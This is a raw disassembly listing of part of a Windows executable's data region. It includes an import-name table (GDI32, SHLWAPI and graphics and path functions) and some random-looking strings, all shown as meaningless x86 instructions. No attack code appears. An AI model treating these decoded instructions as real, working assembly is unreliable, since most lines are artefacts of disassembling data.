  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	mov    ebp,0x678df67a
  413f67:	xlat   BYTE PTR ds:[ebx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	inc    DWORD PTR [eax]
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	gs lock pop ds
  413f71:	push   ss
  413f72:	ror    BYTE PTR [edi-0x29],cl
  413f75:	repz adc BYTE PTR [edx-0x3b],cl
  413f79:	sahf   
  413f7a:	(bad)  
  413f7b:	cmc    
  413f7c:	push   ss
  413f7d:	(bad)  
  413f7e:	ffreep st(1)
  413f80:	pusha  
  413f81:	ins    DWORD PTR es:[edi],dx
  413f82:	jnp    0x413fa5
  413f84:	test   eax,ecx
  413f86:	add    DWORD PTR [ecx-0x76],esi
  413f89:	ins    DWORD PTR es:[edi],dx
  413f8a:	ins    BYTE PTR es:[edi],dx
  413f8b:	fwait
  413f8c:	cmp    al,0xe0
  413f8e:	mov    cl,0x87
  413f90:	sub    DWORD PTR [eax],edi
  413f92:	call   0x2c94:0xa404f436
  413f99:	call   0x73f9df54
  413f9e:	and    eax,0xf4a8a1c4
  413fa3:	daa    
  413fa4:	sti    
  413fa5:	adc    ebx,DWORD PTR [eax]
  413fa7:	cmp    al,0x94
  413fa9:	outs   dx,BYTE PTR ds:[esi]
  413faa:	adc    ebp,DWORD PTR [edx+0x13b27212]
  413fb0:	inc    esi
  413fb1:	mov    dh,0x93
  413fb3:	popa   
  413fb4:	fcomp  QWORD PTR [edx-0x73dd24cb]
  413fba:	outs   dx,BYTE PTR ds:[esi]
  413fbb:	adc    edi,ecx
  413fbd:	or     bl,al
  413fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fc0:	and    BYTE PTR ds:0x27dbe2be,dh
  413fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fc7:	in     al,dx
  413fc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fc9:	push   eax
  413fca:	rol    DWORD PTR [ecx+esi*8-0x6f],1
  413fce:	jne    0x414043
  413fd0:	mov    bh,0x5
  413fd2:	data16 jmp 0x413f59
  413fd5:	xor    DWORD PTR [edi-0x9],0xffffffec
  413fd9:	es ffreep st(6)
  413fdc:	sbb    BYTE PTR [ecx+ebp*1-0x39dcebe4],bl
  413fe3:	stc    
  413fe4:	das    
  413fe5:	stc    
  413fe6:	popa   
  413fe7:	and    eax,0x94281c23
  413fec:	fwait
  413fed:	nop
  413fee:	push   ecx
  413fef:	mov    edx,0x426694d4
  413ff4:	cli    
  413ff5:	not    DWORD PTR [ebx+0x3a]
  413ff8:	dec    esp
  413ff9:	std    
  413ffa:	out    0x9,al
  413ffc:	mov    ds:0x9bb50189,al
  414001:	bnd ret 
